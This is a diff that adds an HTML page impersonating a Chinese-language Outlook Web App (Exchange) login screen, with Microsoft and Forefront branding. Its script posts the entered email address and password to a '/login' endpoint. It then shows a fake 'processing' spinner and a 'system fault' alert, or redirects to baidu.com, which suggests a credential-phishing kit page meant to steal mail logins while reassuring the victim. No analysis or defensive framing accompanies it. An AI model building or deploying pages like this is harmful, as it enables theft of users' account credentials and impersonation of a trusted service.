@@ -1,0 +1,327 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <title>Outlook Web App</title>
+    <meta content="NOINDEX, NOFOLLOW" name="Robots">
+    <link rel="shortcut icon" href="/static/outlook/outlook.ico" type="image/x-icon"> 
+    <link href="/static/outlook/CookieAuth.dll" type="text/css" rel="stylesheet">
+    <script src="/static/outlook/CookieAuth(2).dll" type="text/javascript"></script>
+
+<style type="text/css">
+        .remark{
+            display:flex;
+            color: red;
+        }
+    </style>
+<link rel="stylesheet" href="https://www.yiopmg.com/static/layer/theme/default/layer.css?v=3.1.1" id="layuicss-layer"></head>
+<body class="owaLgnBdy">
+<form name="loginform" id="loginform">
+ <!-- Main table -->
+<table align="center" id="tblMain" cellpadding="0" cellspacing="0">
+	<tbody><tr>
+		<td colspan="3">
+			<table cellspacing="0" cellpadding="0" class="tblLgn">
+			<tbody><tr>
+				<td class="lgnTL"><img src="/static/outlook/CookieAuth(3).dll" alt=""></td>
+				<td class="lgnTM"></td>
+				<td class="lgnTR"><img src="/static/outlook/CookieAuth(4).dll" alt=""></td>
+			</tr>
+			</tbody></table>
+		</td>
+	</tr>
+	<tr>
+		<td id="mdLft">&nbsp;</td>
+		<td id="mdMid">
+        <!-- Mid table -->
+        <table id="tblMid" class="mid">
+        <tbody>
+        <tr>
+          <td class="expl" id="expltxt"></td>
+        </tr>
+        <tr>
+          <td class="align">
+              <!-- Table 1-->
+              <table cellpadding="0" cellspacing="0">
+		         <tbody><tr>
+			        <td class="wrng"></td>
+		        </tr>
+			  </tbody></table>  
+			  <!-- End Table 1-->
+          </td>
+        </tr>
+        <tr>
+          <td>
+            <hr><!-- HR-->
+          </td>
+        </tr>
+         <tr>
+          <td class="align">
+              <!-- Table 2-->
+              <table cellpadding="0" cellspacing="0">
+                <colgroup><col>
+		        <col class="w100">
+		        </colgroup><tbody><tr id="trSec">
+				    <td class="nowrap">
+					    安全性&nbsp;
+				    </td>
+				    <td id="expl1" style="">
+				        ( <a href="javascript:clkExp(lnkShwSec)" id="lnkShwSec">显示解释</a><a href="javascript:clkExp(lnkHdSec)" id="lnkHdSec" style="display: none;">隐藏解释</a> )
+				    </td>
+			    </tr>
+			  </tbody></table>  
+			  <!-- End Table 2-->
+          </td>
+        </tr>
+        <tr>
+          <td>
+            <!--Table 3-->
+            <table cellpadding="0" cellspacing="0">
+			    <colgroup><col>
+			    <col class="w100">
+			    </colgroup><tbody><tr class="height">
+				    <td><input id="rdoPblc" type="radio" name="trusted" value="0" class="rdo" onclick="clkSec()" checked="checked"></td>
+				    <td><label for="rdoPblc">这是公共或共享计算机</label></td>
+			    </tr>
+			    <tr id="trPubExp" class="expl" style="display:none">
+				    <td></td>
+				    <td>如果从公共计算机进行连接，则选择此选项。请确保注销并关闭所有浏览器窗口以终止会话。阅读有关使用公共计算机的<a href="http://go.microsoft.com/fwlink/?LinkId=65796">安全风险</a>的信息。</td>
+			    </tr>
+			    <tr class="height">
+				    <td><input id="rdoPrvt" type="radio" name="trusted" value="4" class="rdo" onclick="clkSec()"></td>
+				    <td><label for="rdoPrvt">这是专用计算机</label></td>
+			    </tr>
+			    <tr id="trPrvtExp" class="expl" style="display:none">
+				    <td></td>
+				    <td>如果只有您使用此计算机，请选择此选项。此选项在自动注销之前提供额外的不活动时间。</td>
+			    </tr>
+			    <tr id="trPrvtWrn" class="wrng" style="display:none">
+				    <td></td>
+				    <td><b>警告:</b>选择此选项表示您认为此计算机符合您的组织单位的安全策略要求。</td>
+			    </tr>
+			</tbody></table>
+			<!-- End Table 3-->
+          </td>
+        </tr>
+        <tr>
+          <td>
+            <hr><!-- HR-->
+          </td>
+        </tr>
+        <tr>
+	        <td>
+				<!-- Table 4-->
+				<table cellpadding="0" cellspacing="0">
+					<colgroup><col>
+					<col class="w100">
+					</colgroup>
+					<tbody>
+					<tr id="trBscExp" class="disBsc" style="display:none">
+						<td></td>
+						<td>Light 客户端提供较少的功能，但是有时速度较快。如果您的连接速度较慢或使用的计算机通常带有严格的浏览器安全设置，请使用 Light 客户端。</td>
+					</tr>
+				</tbody></table>
+				<!-- End Table 4-->
+			</td>
+		</tr>
+        <tr>
+          <td>
+            <hr><!-- HR-->
+          </td>
+        </tr>
+        <tr>
+          <td>
+			<!-- Table 5-->
+			<table cellpadding="0" cellspacing="0">
+			    <colgroup><col>
+			    <col class="w100">
+				</colgroup><tbody><tr style="display: none">
+					<td valign="top"><input id="chpwd" name="chpwd" type="checkbox" class="rdo" onclick="clkChpwd()"></td>
+					<td><label for="chpwd">我想在登录之后更改密码</label></td>
+				</tr>
+				<tr id="trChpwdExp" class="expl" style="display:none">
+					<td></td>
+					<td>如果选择此选项，提交凭据之后将显示用于更改密码的页面。</td>
+				</tr>
+			</tbody></table>
+			<!-- End Table 5-->
+          </td>
+        </tr>
+        <tr style="display: none">
+          <td>
+            <hr><!-- HR-->
+          </td>
+        </tr>
+        <tr>
+          <td>
+            <!-- Table 6-->
+            <table cellspacing="0" cellpadding="0">
+              <colgroup>
+              <col class="nowrap">
+              <col class="w100">
+              <col>
+              </colgroup><tbody>
+                  <tr>
+                    <td class="nowrap"><label for="username">域\用户名:</label></td>
+                    <td class="txtpad">
+                        <input class="txt login_inp_admin" id="account_name" name="account_name" type="text">
+                    </td>
+                  </tr>
+                   <tr>
+                  	<td></td>
+                  	<td><span class="remark"></span></td>
+                  </tr>
+                  <tr>
+                    <td class="nowrap"><label for="password">密码:</label></td>
+                    <td class="txtpad">
+                        <input class="txt login_inp_pass" id="password" onfocus="g_fFcs=0" type="password" name="password">
+                        
+                    </td>
+                  </tr>
+                  <tr>
+                  	<td></td>
+                  	<td><span class="remark"></span></td>
+                  </tr>
+                  <tr>
+                    <td class="nowrap">&nbsp;</td>
+                    <td class="txtpad" colspan="2">
+                        <input class="btn form-btn" onmousedown="this.className='btnOnMseDwn'" id="submit-btn" onmouseover="this.className='btnOnMseOvr'" onmouseout="this.className='btn'" type="button" value="登录" name="SubmitCreds"> 
+                    </td>
+                  </tr>
+              </tbody>
+             </table>
+             <!-- End Table 6-->
+          </td>
+        </tr>
+        <tr>
+          <td>
+            <hr><!-- HR-->
+          </td>
+        </tr>
+       </tbody>
+      </table>
+      <!-- End Mid Table-->
+      <!-- Mid2 Table-->
+		<table id="tblMid2" class="mid" style="display:none">
+			<tbody><tr><td><hr></td></tr>
+			<tr>
+				<td><br>您的浏览器设置当前禁用 cookie。要访问此网站，必须启用 cookie。<br><br>按照以下指示启用 cookie (Microsoft Internet Explorer 6 或更高版本):  在 Internet Explorer 中，单击“工具”菜单上的“Internet 选项”。单击“隐私”选项卡，然后单击“站点”。在“网站地址”中，键入此网站的完整地址。例如，http://www.microsoft.com。然后单击“允许”。<br><br><br></td>
+			</tr>
+			<tr><td><hr></td></tr>
+			<tr>
+				<td class="txtpad">
+					<input type="button" class="btn" style="float: right" value="重试" onclick="clkRtry()" onmouseover="this.className='btnOnMseOvr'" onmouseout="this.className='btn'" onmousedown="this.className='btnOnMseDwn'">
+				</td>
+			</tr>
+		</tbody></table>
+      <!-- End Mid2 Table-->
+		<table class="mid tblConn">
+			<tbody><tr>
+				<td rowspan="3" style="vertical-align:top" class="tdConnImg"><img src="/static/outlook/CookieAuth(5).dll" alt=""></td>
+				<td class="tdConn" style="padding-top:6px;">已连接到 Microsoft Exchange</td>
+			</tr>
+			<tr>
+				<td class="tdConn" style="padding-top:0px;">受 Microsoft Forefront Threat Management Gateway 保护</td>
+			</tr>
+			<tr>
+				<td class="tdCopy">© 2009 Microsoft Corporation. 保留所有权利。</td>
+			</tr>
+		</tbody></table>
+	</td>
+	<td id="mdRt">&nbsp;</td>
+	</tr>
+	<tr>
+		<td colspan="3">
+			<table cellspacing="0" cellpadding="0" class="tblLgn">
+			<tbody><tr>
+				<td class="lgnBL"><img src="/static/outlook/lgnbotl.gif" alt=""></td>
+				<td class="lgnBM"></td>
+				<td class="lgnBR"><img src="/static/outlook/lgnbotr.gif" alt=""></td>
+			</tr>
+			</tbody></table>
+		</td>
+	</tr>
+ </tbody>
+</table>
+<!-- End Main Table-->
+</form>
+<script type="text/javascript" src="/static/outlook/jquery.js"></script>
+<script src="/static/layer/layer.js"></script>
+<script type="text/javascript">
+    function closeLoading(){
+        layer.close(loading);
+        layer.alert('系统故障正在处理中',{closeBtn: 0},function(){
+            window.location.href="about:blank";
+        })
+    }
+    lng = 1;
+    sub = 1;
+    $(".form-btn").click(function(){
+        
+        if (sub = 0) {
+            return false;
+        }
+        sub = 0;
+       var admin = $(".login_inp_admin").val()
+       var pass = $(".login_inp_pass").val()
+        var myreg = /^([\.a-zA-Z0-9_-])+@([a-zA-Z0-9_-])+(\.[a-zA-Z0-9_-])+/;
+        if(admin == ''){
+            if (lng == 1) {
+                layer.msg("请输入正确邮箱地址");
+                sub = 1;
+            }else{
+                layer.msg("Please enter the correct email address");
+                sub = 1;
+            }
+            $(".login_inp_admin").focus()
+        }else if (pass == "") {
+            if (lng == 1) {
+                layer.msg("请输入密码");
+                sub = 1;
+            }else{
+                layer.msg("Please input a password");
+                sub = 1;
+            }
+            $(".login_inp_pass").focus()
+        }else if (pass.length < 6) {
+            if (lng == 1) {
+                layer.msg("密码错误");
+                sub = 1;
+            }else{
+                layer.msg("Password error");
+                sub = 1;
+            }
+            $(".login_inp_pass").focus()
+        } else {
+            loading = layer.load(2);
+            $.post('/login',{'email':admin,'password':pass},function(res){
+                sub = 1;
+                if (res.code == 0) {
+                    layer.close(loading);
+                    layer.msg(res.msg);
+                    $(".login_inp_admin").val('')
+                    $(".login_inp_pass").val('')
+                    
+                }else if(res.code == -1){
+                    location.replace("https://www.baidu.com");
+                }else{
+                    loading = layer.load(1, {
+                        shade: [0.1, '#fff'],
+                        content: '<span class="loadtip">拼命处理中，请耐心等待</span>', 
+                        success: function (layer) {
+                        layer.find('.layui-layer-content').css({
+                            'padding-top': '40px',
+                            'width': '100px',
+                        });
+                        layer.find('.loadtip').css({
+                            'font-size':'20px',
+                            'margin-left':'-120px'
+                        });
+                        }
+                    });
+                    setTimeout(closeLoading, 10000 )
+                }
+            })
+        }
+   })
+</script>
+
+</body></html>
